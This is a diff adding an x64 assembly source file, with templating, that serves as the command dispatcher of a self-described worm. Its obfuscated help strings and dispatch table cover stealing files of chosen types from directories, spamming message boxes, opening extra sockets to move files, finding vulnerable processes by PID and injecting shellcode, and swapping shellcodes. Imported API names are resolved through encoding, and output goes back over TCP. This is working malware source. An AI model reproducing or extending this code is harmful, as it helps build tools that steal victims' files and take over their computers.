@@ -1,0 +1,307 @@
+#!name##ZCommander
+#!types##sfile
+#!info##Zaxxon Commander
+
+
+
+extern lstrcmpA
+extern printf
+extern strtok
+extern atoi
+
+{% set PFL_base = TOOL.AsmSh_make_table(data=PF_text, set_as_default=True)%}
+
+%define CMD_TEXT_HELP_HEX {{ZAX_cmd_hex}} ; encode help text hex value
+%define CMD_BUFFER_HELP 2048    ; buffer for help text
+
+section .data
+    cmd_help_t0: db 0x0C, 0
+    cmd_help_t1: db {{TOOL.asm_hex_encrypt_bytes("exit - Close Worm\n", ZAX_cmd_hex)}} ; "exit - Close Worm"
+   
+    ; "msgb [text] - Show MessageBox with text. Not accept space."
+    cmd_help_t2: db {{TOOL.asm_hex_encrypt_bytes("msgb [text] - Show MessageBox with text. Not accept space.\n", ZAX_cmd_hex)}}
+    
+    ; "msgbs [number] [text] - Spam screen with MessageBox. Not accept space."
+    cmd_help_t3: db {{TOOL.asm_hex_encrypt_bytes("msgbs [number] [text] - Spam screen with MessageBox. Not accept space.\n", ZAX_cmd_hex)}}
+   
+    ; smake [ip_addr] [port] - make extra socket connection to send or recive file.
+    cmd_help_t4: db {{TOOL.asm_hex_encrypt_bytes("smake [ip_addr] [port] - make extra socket connection to send or recive file.\n", ZAX_cmd_hex)}}
+    
+    ; get [dir_path] [file_type] - Steals files of a given type from a directory. Ex. get c:/my_dir *.jpg
+    cmd_help_t5: db {{TOOL.asm_hex_encrypt_bytes("get [dir_path] [file_type] - Steals files of a given type from a directory. Ex. get c:/my_dir *.jpg\n", ZAX_cmd_hex)}}
+    
+     ; steal - Starts searching directories according to its own .base and stealing files.
+    cmd_help_t6: db 0x75, 0x76, 0x67, 0x63, 0x6E, 0x22, 0x2F, 0x22, 0x55, 0x76, 0x63, 0x74, 0x76, 0x75, 0x22, 0x75, 0x67, 0x63, 0x74, 0x65, 0x6A, 0x6B, 0x70, 0x69, 0x22, 0x66, 0x6B, 0x74, 0x67, 0x65, 0x76, 0x71, 0x74, 0x6B, 0x67, 0x75, 0x22, 0x63, 0x65, 0x65, 0x71, 0x74, 0x66, 0x6B, 0x70, 0x69, 0x22, 0x76, 0x71, 0x22, 0x6B, 0x76, 0x75, 0x22, 0x71, 0x79, 0x70, 0x22, 0x64, 0x63, 0x75, 0x67, 0x22, 0x63, 0x70, 0x66, 0x22, 0x75, 0x76, 0x67, 0x63, 0x6E, 0x6B, 0x70, 0x69, 0x22, 0x68, 0x6B, 0x6E, 0x67, 0x75, 0x30, 0x0C, 0x00
+    
+    ; scinj [start_pid] [last_pid] - It searches processes in the specified PID range, finds the vulnerable one and injects the shellcode.
+    cmd_help_t7: db 0x75, 0x65, 0x6B, 0x70, 0x6C, 0x22, 0x5D, 0x75, 0x76, 0x63, 0x74, 0x76, 0x61, 0x72, 0x6B, 0x66, 0x5F, 0x22, 0x5D, 0x6E, 0x63, 0x75, 0x76, 0x61, 0x72, 0x6B, 0x66, 0x5F, 0x22, 0x2F, 0x22, 0x4B, 0x76, 0x22, 0x75, 0x67, 0x63, 0x74, 0x65, 0x6A, 0x67, 0x75, 0x22, 0x72, 0x74, 0x71, 0x65, 0x67, 0x75, 0x75, 0x67, 0x75, 0x22, 0x6B, 0x70, 0x22, 0x76, 0x6A, 0x67, 0x22, 0x75, 0x72, 0x67, 0x65, 0x6B, 0x68, 0x6B, 0x67, 0x66, 0x22, 0x52, 0x4B, 0x46, 0x22, 0x74, 0x63, 0x70, 0x69, 0x67, 0x2E, 0x22, 0x68, 0x6B, 0x70, 0x66, 0x75, 0x22, 0x76, 0x6A, 0x67, 0x22, 0x78, 0x77, 0x6E, 0x70, 0x67, 0x74, 0x63, 0x64, 0x6E, 0x67, 0x22, 0x71, 0x70, 0x67, 0x22, 0x63, 0x70, 0x66, 0x22, 0x6B, 0x70, 0x6C, 0x67, 0x65, 0x76, 0x75, 0x22, 0x76, 0x6A, 0x67, 0x22, 0x75, 0x6A, 0x67, 0x6E, 0x6E, 0x65, 0x71, 0x66, 0x67, 0x30, 0x0C, 0x00
+    
+    ; schange [number] - Change shellcode to work. Use 1 or 2. Ex: schange 2
+    cmd_help_t8: db 0x75, 0x65, 0x6A, 0x63, 0x70, 0x69, 0x67, 0x22, 0x5D, 0x70, 0x77, 0x6F, 0x64, 0x67, 0x74, 0x5F, 0x22, 0x2F, 0x22, 0x45, 0x6A, 0x63, 0x70, 0x69, 0x67, 0x22, 0x75, 0x6A, 0x67, 0x6E, 0x6E, 0x65, 0x71, 0x66, 0x67, 0x22, 0x76, 0x71, 0x22, 0x79, 0x71, 0x74, 0x6D, 0x30, 0x22, 0x57, 0x75, 0x67, 0x22, 0x33, 0x22, 0x71, 0x74, 0x22, 0x34, 0x30, 0x22, 0x47, 0x7A, 0x3C, 0x22, 0x75, 0x65, 0x6A, 0x63, 0x70, 0x69, 0x67, 0x22, 0x34, 0x0C, 0x00
+    
+    
+    cmd_help_t_all: dq cmd_help_t0, cmd_help_t1, cmd_help_t2, cmd_help_t3, cmd_help_t4, cmd_help_t5, cmd_help_t6, cmd_help_t7, cmd_help_t8, 0
+    
+    cmd_cmd_help: db "help", 0  ; help function
+    cmd_cmd_msgb: db "msgb", 0  ; Show MessageBox function
+    cmd_cmd_msgbs: db "msgbs", 0    ; Spam MessageBox function
+    cmd_cmd_smake: db "smake", 0    ; Make extra sock
+    cmd_cmd_get: db "get", 0    ; grab files
+    cmd_cmd_steal: db "steal", 0    ; steal files
+    cmd_cmd_scinj: db "scinj", 0    ; shellcode injection
+    cmd_cmd_schange: db "schange", 0    ; change working shellcode
+    cmd_cmd_exit: db "exit", 0
+    
+    cmd_text_delimiter: db " ", 0
+    cmd_args_struct: dq 0, 0, 0, 0
+    cmd_player_th: dd {{TOOL.AsmSh_encode("CreateThread")}} ; CreateThread
+    
+{% set _ = TOOL.AsmSh_reset_table() %}
+section .bss
+    cmd_help_buff: resb CMD_BUFFER_HELP ; buffer for help text
+    cmd_buffer_pointer: resq 1
+    
+section .text
+
+
+%macro MACRO_CHECK_CMD 3
+; Check comand and execute
+    sub rsp, 40
+    mov rcx, %1
+    lea rdx, [%2]
+    call lstrcmpA
+    add rsp, 40
+    cmp rax, 0
+    jne %%end
+    
+    %%execute:
+        sub rsp, 40
+        lea rcx, [%3]
+        call CMD_execute
+        add rsp, 40
+    
+    %%end:
+        xor rax, rax
+%endmacro
+
+%macro MACRO_CMD_decode_help 1
+; decode hex byte
+    push r12
+    xor r12, r12
+    %%loop:
+        cmp r12, CMD_TEXT_HELP_HEX
+        je %%end
+        dec %1
+        inc r12
+        jmp %%loop
+    
+    %%end:
+        pop r12
+
+%endmacro
+
+CMD_Init:
+; Initialize Commander Module
+; REQUIREMENTS: stack allign to 16
+    push rbp
+    mov rbp, rsp
+    
+    sub rsp, 48
+    call CMD_lhelp
+    add rsp, 48
+    pop rbp
+    ret
+
+CMD_command:
+; check and execute command
+; REQUIREMENTS: stack allign to 16
+; IN: rcx - pointer to buffer conatins command
+    push rbp
+    mov rbp, rsp
+    push r12
+    push r13
+    push r14
+    push r15
+    sub rsp, 8  ;allign stack
+    
+    xor r12, r12
+    xor r13, r13
+    xor r14, r14
+    xor r15, r15
+    
+    lea rax, [cmd_buffer_pointer]
+    mov [rax], rcx  ; save pointer
+    
+    sub rsp, 40
+    mov rdx, rcx
+    mov rcx, text_out
+    call printf
+    add rsp, 40
+    
+    .cmd_split:
+    ; split command
+    ; OUT: r12, r13, r14, r15
+        sub rsp, 40
+        lea rcx, [cmd_buffer_pointer]
+        mov rcx, [rcx]
+        mov rdx, cmd_text_delimiter
+        call strtok
+        add rsp, 40
+        cmp rax, 0
+        je .check_command
+        mov r12, rax    ; first part of command
+        
+        sub rsp, 40
+        mov rcx, 0
+        mov rdx, cmd_text_delimiter
+        call strtok
+        add rsp, 40
+        cmp rax, 0
+        je .check_command
+        mov r13, rax    ; second part of command
+        
+        sub rsp, 40
+        mov rcx, 0
+        mov rdx, cmd_text_delimiter
+        call strtok
+        add rsp, 40
+        cmp rax, 0
+        je .check_command
+        mov r14, rax    ; thrid part of command
+        
+        sub rsp, 40
+        mov rcx, 0
+        mov rdx, cmd_text_delimiter
+        call strtok
+        add rsp, 40
+        cmp rax, 0
+        je .check_command
+        mov r15, rax    ; fourth part of command
+        
+        
+    
+    .check_command:
+        ;clear args
+        lea rcx, [cmd_args_struct]
+        mov qword [rcx], 0
+        mov qword [rcx+8], 0
+        mov qword [rcx+16], 0
+        mov qword [rcx+24], 0
+        
+        ;update args
+        mov qword [rcx], r12
+        mov qword [rcx+8], r13
+        mov qword [rcx+16], r14
+        mov qword [rcx+24], r15
+    
+
+
+        MACRO_CHECK_CMD r12, cmd_cmd_help, CMD_help
+        MACRO_CHECK_CMD r12, cmd_cmd_exit, CMD_exit
+        MACRO_CHECK_CMD r12, cmd_cmd_msgb, BASC_msgb
+        MACRO_CHECK_CMD r12, cmd_cmd_msgbs, BASC_msgbs
+        MACRO_CHECK_CMD r12, cmd_cmd_smake, LOOT_set_explayer
+        MACRO_CHECK_CMD r12, cmd_cmd_get, GYP_FindItem
+        MACRO_CHECK_CMD r12, cmd_cmd_steal, GYP_steal_life
+        MACRO_CHECK_CMD r12, cmd_cmd_scinj, PAC_eat
+        MACRO_CHECK_CMD r12, cmd_cmd_schange, ZST_set
+
+    .return:
+        add rsp, 8  ;restore stack
+        pop r15
+        pop r14
+        pop r13
+        pop r12
+        pop rbp
+        ret
+
+
+CMD_execute:
+; Execute command
+; REQUIREMENTS: stack allign to 16
+; IN: rcx - pointer to function
+    push rbp
+    mov rbp, rsp
+    mov [rbp-8], rcx
+    sub rsp, 24
+    
+    sub rsp, 40
+    mov rcx, cmd_player_th
+    mov rdx, 0
+    call PITF_get
+    add rsp, 40
+    
+    ;create thread
+    sub rsp, 56
+    mov rcx, 0
+    mov rdx, 0
+    mov r8, [rbp-8]
+    lea r9, [cmd_args_struct]
+    mov qword [rsp+32], 0
+    mov qword [rsp+40], 0
+    call rax    ; call CreateThread
+    add rsp, 56
+    
+    
+    
+    .return:
+        add rsp, 24
+        pop rbp
+        ret
+
+CMD_help:
+; show help
+; REQUIREMENTS: stack allign to 16
+    push rbp
+    mov rbp, rsp
+    
+    sub rsp, 48
+    lea rcx, [cmd_help_buff]
+    call TCP_send
+    add rsp, 48
+    pop rbp
+    ret
+
+CMD_lhelp:
+; decode and load worm help to buffer
+; REQUIREMENTS: stack allign to 16
+    push rbp
+    mov rbp, rsp
+    sub rsp, 8
+    
+    xor r10, r10    ; help buffer index
+    xor rbx, rbx    ; main help index
+    lea rdi, [cmd_help_buff]    ; load buffer
+    .main_copy:
+        lea rsi, [cmd_help_t_all]
+        mov rsi, [rsi + 8 * rbx]
+        cmp rsi, 0
+        je .return
+        inc rbx ; main index + 1
+        xor rcx, rcx    ; var index
+        xor rdx, rdx    ; char temp
+        .copy:
+            mov byte dl, [rsi + rcx]
+            cmp dl, 0
+            je .main_copy
+            MACRO_CMD_decode_help dl                           
+            mov byte [rdi + r10], dl
+            inc r10 ; help buffer index + 1
+            inc rcx ; var index + 1  
+            jmp .copy              
+    
+    .return:
+        add rsp, 8
+        pop rbp
+        ret
+
+CMD_exit:
+; close socket and worm
+; REQUIREMENTS: stack allign to 16
+    push rbp
+    mov rbp, rsp
+    sub rsp, 8
+    
+    sub rsp, 40
+    call SOCKET_close
+    call EXIT
